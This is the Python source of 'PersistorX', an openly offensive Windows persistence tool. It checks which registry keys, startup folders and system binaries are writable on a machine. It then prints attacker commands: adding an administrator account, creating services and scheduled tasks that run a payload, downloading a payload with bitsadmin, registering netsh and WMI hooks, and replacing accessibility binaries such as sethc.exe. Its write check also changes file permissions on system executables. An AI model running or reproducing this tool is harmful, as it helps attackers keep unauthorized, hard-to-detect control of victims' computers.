# PersistorX v1.0
# Created by ibrahim Ali - 0xRobinHo0d - https://x.com/ibraheemmajzoup



import os
import sys
import ctypes
import winreg  # For registry access (works only on Windows)
import subprocess
import argparse
from colorama import init, Fore, Style

__version__ = "1.0"


def init_colors():
    init(autoreset=True)
    print(Fore.RED + Style.BRIGHT + "\n=== Windows Persistence Scanner v1.0 === \n\n=== Scan Windows for potential persistence mechanisms ===\n")

# All techniques

techniques = [
    ("Account Creation", "Create a new user account with privileges to maintain access after reboot."),
    ("Startup Folder", "Place shortcuts in the Startup folder to run programs at login."),
    ("Registry Autorun (Run/RunOnce)", "Use registry keys to automatically run programs on system startup."),
    ("Winlogon Scripts", "Modify Winlogon registry keys to run the program during login."),
    ("File Association Hijacking", "Change file associations to execute the program when files open."),
    ("Shortcut Modification", "Alter shortcuts to point to your files that run when clicked."),
    ("PowerShell Profile", "Inject the code into PowerShell’s startup profile to run at launch."),
    ("Scheduled Tasks", "Create or modify scheduled tasks to run the program at specified times."),
    ("Windows Services", "Create or modify Windows services to execute the program."),
    ("DLL Hijacking", "Place your DLLs where legitimate apps will load them."),
    ("COM Hijacking / Proxying", "Change COM registry entries to run your program instead of legitimate apps."),
    ("Accessibility Binaries", "Replace system accessibility tools with your executables."),
    ("BITSAdmin Jobs", "Use BITS to silently download and run the payloads."),
    ("Netsh Helper DLL", "Register a DLL to be loaded by the netsh utility."),
    ("Application Shimming", "Use shims to inject code into legitimate applications."),
    ("WMI Event Subscription", "Set up WMI events to run the program when certain conditions are met."),
    ("IFEO & AppInit/AppCert DLLs", "Hijack app execution using IFEO/AppInit/AppCert DLL settings."),
    ("Time Provider DLLs", "Register a DLL as a time provider for persistence."),
    ("Screensaver Replacement", "Replace screensavers with the program that runs on idle."),
    ("Print-related DLLs", "Inject a DLLs into the print spooler process."),
    ("LSA-loaded DLLs", "Inject a DLLs into the Local Security Authority process."),
    ("Developer Hooks", "Place a code in developer scripts to execute automatically.")
]



summaries = {
    'Account Creation': 'Add a new privileged user account to the system.',
    'Startup Folder': 'Place a shortcut or executable in a Startup folder.',
    'Registry Autorun (Run/RunOnce)': 'Write entries to Run/RunOnce registry keys.',
    'Winlogon Scripts': 'Hijack Winlogon Shell, Userinit, or environment scripts.',
    'File Association Hijacking': 'Override file handlers to run malicious code.',
    'Shortcut Modification': 'Modify .lnk shortcuts to execute payloads.',
    'PowerShell Profile': 'Inject commands into PowerShell profile on startup.',
    'Scheduled Tasks': 'Create or modify tasks for code execution.',
    'Windows Services': 'Install or alter services to run attacker binaries.',
    'DLL Hijacking': 'Plant DLLs in application search paths.',
    'COM Hijacking / Proxying': 'Override or proxy COM registrations.',
    'Accessibility Binaries': 'Replace accessibility executables for SYSTEM shell.',
    'BITSAdmin Jobs': 'Use BITS to download and execute payloads.',
    'Netsh Helper DLL': 'Register helper DLL loaded by netsh.',
    'Application Shimming': 'Use shim DBs to inject code into apps.',
    'WMI Event Subscription': 'Create persistent WMI event consumers.',
    'IFEO & AppInit/AppCert DLLs': 'Leverage IFEO/AppInit/AppCert mechanisms.',
    'Time Provider DLLs': 'Register malicious time-provider DLL.',
    'Screensaver Replacement': 'Replace .scr screensavers to run code.',
    'Print-related DLLs': 'Install malicious print processor or monitor DLLs.',
    'LSA-loaded DLLs': 'Add custom LSA authentication or notification DLLs.',
    'Developer Hooks': 'Place malicious scripts in Git or VS hooks.'
}

# Guidance commands for command-based techniques
guidance_commands = {
    'Account Creation': [
        'net user <Username> <Password> /add',
        'net localgroup Administrators <Username> /add'
    ],
    'Scheduled Tasks': [
        'schtasks /create /tn "<TaskName>" /tr "<PathToPayload>" /sc onlogon'
    ],
    'Windows Services': [
        'sc create <ServiceName> binPath= "<PathToPayload>" start= auto'
    ],
    'BITSAdmin Jobs': [
        'bitsadmin /create /download <JobName> <URL> "%TEMP%\\payload.exe"',
        'bitsadmin /resume <JobName>'
    ],
    'Netsh Helper DLL': [
        'reg add "HKLM\\System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\HelperDLL" /t REG_SZ /d "<PathToDLL>" /f'
    ],
    'Application Shimming': [
        'sdbinst <YourCustomShim.sdb>'
    ],
    'WMI Event Subscription': [
        'wmic /namespace:\\\\root\\subscription path __EventFilter call Create FilterName="MyFilter"',
        'wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer call Create Name="MyConsumer" CommandLineTemplate="<PathToPayload>"'
    ]
}

#  scan targets for each technique

def get_scans():
    return {
        'Account Creation': [
            {'type': 'command', 'name': 'Local Users', 'cmd': ['net', 'user']},
            {'type': 'command', 'name': 'Domain Users', 'cmd': ['net', 'user', '/domain']}
        ],
        'Startup Folder': [
            {'type': 'folder', 'path': r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"},
            {'type': 'folder', 'path': r"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"}
        ],
        'Registry Autorun (Run/RunOnce)': [
            {'type': 'registry', 'root': winreg.HKEY_CURRENT_USER, 'path': r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {'type': 'registry', 'root': winreg.HKEY_CURRENT_USER, 'path': r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"}
        ],
        'Winlogon Scripts': [
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"},
            {'type': 'registry', 'root': winreg.HKEY_CURRENT_USER, 'path': r"Environment"}
        ],
        'File Association Hijacking': [
            {'type': 'registry', 'root': winreg.HKEY_CLASSES_ROOT, 'path': r"*\\\\shell\\\\open\\\\command"},
            {'type': 'registry', 'root': winreg.HKEY_CLASSES_ROOT, 'path': r".txt"},
            {'type': 'registry', 'root': winreg.HKEY_CLASSES_ROOT, 'path': r".docx"},
            {'type': 'registry', 'root': winreg.HKEY_CLASSES_ROOT, 'path': r".pdf"}
        ],
        'Shortcut Modification': [
            {'type': 'folder', 'path': r"%USERPROFILE%\\Desktop"},
            {'type': 'folder', 'path': r"%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs"}
        ],
        'PowerShell Profile': [
            {'type': 'folder', 'path': r"%USERPROFILE%\\Documents\\WindowsPowerShell"}
        ],
        'Scheduled Tasks': [
            {'type': 'command', 'name': 'Scheduled Tasks', 'cmd': ['schtasks', '/query', '/fo', 'LIST', '/v']}
        ],
        'Windows Services': [
            {'type': 'command', 'name': 'Services', 'cmd': ['sc', 'query', 'state=', 'all']}
        ],
        'DLL Hijacking': [
            {'type': 'folder', 'path': r"%WINDIR%\\System32"},
            {'type': 'folder', 'path': r"%WINDIR%"},
            {'type': 'folder', 'path': r"%USERPROFILE%"}
        ],
        'COM Hijacking / Proxying': [
            {'type': 'registry', 'root': winreg.HKEY_CLASSES_ROOT, 'path': r"CLSID"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Classes\\CLSID"}
        ],
        'Accessibility Binaries': [
            {'type': 'file', 'path': r"%WINDIR%\\System32\\sethc.exe"},
            {'type': 'file', 'path': r"%WINDIR%\\System32\\utilman.exe"},
            {'type': 'file', 'path': r"%WINDIR%\\System32\\osk.exe"}
        ],
        'BITSAdmin Jobs': [
            {'type': 'command', 'name': 'BITS Jobs', 'cmd': ['bitsadmin', '/list', '/allusers']}
        ],
        'Netsh Helper DLL': [
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy"}
        ],
        'Application Shimming': [
            {'type': 'command', 'name': 'Shim DBs', 'cmd': ['sdbinst', '-q']}
        ],
        'WMI Event Subscription': [
            {'type': 'command', 'name': 'WMI EventFilters', 'cmd': ['wmic', '/namespace:\\\\root\\subscription', 'path', '__EventFilter', 'get', 'Name']},
            {'type': 'command', 'name': 'WMI Consumers', 'cmd': ['wmic', '/namespace:\\\\root\\subscription', 'path', 'CommandLineEventConsumer', 'get', 'Name']}
        ],
        'IFEO & AppInit/AppCert DLLs': [
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"System\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs"}
        ],
        'Time Provider DLLs': [
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders"}
        ],
        'Screensaver Replacement': [
            {'type': 'folder', 'path': r"%WINDIR%\\System32"},
            {'type': 'registry', 'root': winreg.HKEY_CURRENT_USER, 'path': r"Control Panel\\Desktop"}
        ],
        'Print-related DLLs': [
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"System\\CurrentControlSet\\Control\\Print\\Monitors"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"System\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors"}
        ],
        'LSA-loaded DLLs': [
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"SYSTEM\\CurrentControlSet\\Control\\Lsa"},
            {'type': 'registry', 'root': winreg.HKEY_LOCAL_MACHINE, 'path': r"SYSTEM\\CurrentControlSet\\Services\\NTDS"}
        ],
        'Developer Hooks': [
            {'type': 'folder', 'path': r"%CD%\\.git\\hooks"}
        ],
    }

# Utility functions
def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def scan_registry(root, path):
    data = {}
    try:
        with winreg.OpenKey(root, path) as key:
            for i in range(winreg.QueryInfoKey(key)[1]):
                name, val, _ = winreg.EnumValue(key, i)
                data[name] = val
    except:
        pass
    return data

def can_write_registry(root, path):
    try:
        winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE).Close()
        return True
    except:
        return False

def can_write_path(path):
    try:
        os.makedirs(path, exist_ok=True)
        tmp = os.path.join(path, '.perm')
        open(tmp, 'w').close(); os.remove(tmp)
        return True
    except:
        return False

def can_write_file(path):
    try:
        os.chmod(path, 0o666)
        return True
    except:
        return False

def run_command(cmd):
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True)
        return out.splitlines()
    except:
        return []

def list_methods(scans):
    sep = '╔' + '═' * 115 + '╗'  
    bottom_sep = '╚' + '═' * 115 + '╝'
    header = f"{sep}\n  Available Techniques{' ' * 20}Description of the Technique\n{bottom_sep}"

    print(Fore.CYAN + Style.BRIGHT + header)
 
    technique_index = 36
    for index, (technique, description) in enumerate(techniques, 1):
        if index > 9:
            technique_index = 35	
        print(Fore.YELLOW + " " + f"[{index:2}]".replace(" ", "")  + Fore.GREEN + Style.BRIGHT + f"{technique.ljust(technique_index)} {description}")

    print(Fore.CYAN + Style.BRIGHT + bottom_sep)

def print_result(name, details, can_persist):
    sep = '╔' + '═' * 70 + '╗'
    bottom_sep = '╚' + '═' * 70 + '╝'
    print(Fore.RED + Style.BRIGHT + f"\n{sep}\n Technique: {name}\n{bottom_sep}")

    print(Fore.CYAN + "Description: " + Fore.YELLOW + f"{summaries[name]}\n")
    status = Fore.GREEN + Style.BRIGHT + 'YES' if can_persist else Fore.RED + 'NO'
    print(Fore.CYAN + f"Persistability: {status}\n")
    if can_persist:
        print(Fore.CYAN + "Instructions: ")
        for loc, info in details.items():
            if info.get('writable'):
                if info['type'] == 'registry':
                    print(Fore.GREEN + Style.BRIGHT + f"  reg add \"{loc}\" /v <ValueName> /t REG_SZ /d <Command> /f")
                elif info['type'] == 'folder':
                    print(Fore.GREEN + Style.BRIGHT + f"  copy <YourPayload.exe> \"{loc}\"")
                elif info['type'] == 'file':
                    print(Fore.GREEN + Style.BRIGHT + f"  Replace the file at \"{loc}\" with YourPayload.exe")
        if name in guidance_commands:
            for cmd in guidance_commands[name]:
                print(Fore.GREEN + Style.BRIGHT + f"  {cmd}")
        print()

# Main exec function

if __name__ == '__main__':

    init(autoreset=True)

    r = r"""
  ____               _     _           __  __
 |  _ \ ___ _ __ ___(_)___| |_ ___  _ _\ \/ /
 | |_) / _ \ '__/ __| / __| __/ _ \| '__\  / 
 |  __/  __/ |  \__ \ \__ \ || (_) | |  /  \ 
 |_|   \___|_|  |___/_|___/\__\___/|_| /_/\_\
                                             
"""

    print(Fore.RED + r)

    if sys.platform != 'win32':
        print(Fore.RED + "Error: This tool must be run on Windows.")
        sys.exit(1)

    scans = get_scans()
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-l', '--list', action='store_true', help='List all available persistance techniques')
    parser.add_argument('-m', '--method', type=int,
                        help='Scan for a specific technique by its number')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan all persistance techniques')
    parser.add_argument('--persist-only', action='store_true', help='Show only the applicable persistance techniques')
    parser.add_argument('-v', '--version', action='version', version=f"PersistorX v{__version__}")
    args = parser.parse_args()

    if args.list:
        list_methods(scans)
        sys.exit(0)

    method_keys = list(scans.keys())
    to_scan = []
    if args.method:
        if 1 <= args.method <= len(method_keys):
            to_scan = [method_keys[args.method - 1]]
        else:
            print(Fore.RED + "Invalid method number. Use -l/--list to see options.")
            sys.exit(1)
    elif args.scan:
        to_scan = method_keys
    else:
        parser.print_help()
        sys.exit(1)

    if sys.platform != 'win32':
        print(Fore.RED + "Error: This tool must be run on Windows.")
        sys.exit(1)

    admin = check_admin()
    print(Fore.CYAN + f"Administrator privileges: " + (Fore.GREEN + Style.BRIGHT + "Yes" if admin else Fore.RED + "No\n\n" + Fore.CYAN + "Administrative privileges are recommended for optimal results") + "\n")

    for tech in to_scan:
        items = scans[tech]
        details = {}
        can_persist = True
        for item in items:
            if item['type'] == 'registry':
                writable = can_write_registry(item['root'], item['path'])
                details[item['path']] = {'type': 'registry', 'writable': writable}
                if not writable:
                    can_persist = False
            elif item['type'] == 'folder':
                path = os.path.expandvars(item['path'])
                writable = can_write_path(path)
                details[path] = {'type': 'folder', 'writable': writable}
                if not writable:
                    can_persist = False
            elif item['type'] == 'file':
                path = os.path.expandvars(item['path'])
                writable = can_write_file(path)
                details[path] = {'type': 'file', 'writable': writable}
                if not writable:
                    can_persist = False
            elif item['type'] == 'command':
                # Commands do not affect writability
                details[item['name']] = {'type': 'command', 'writable': True}
        if not args.persist_only or can_persist:
            print_result(tech, details, can_persist)
 
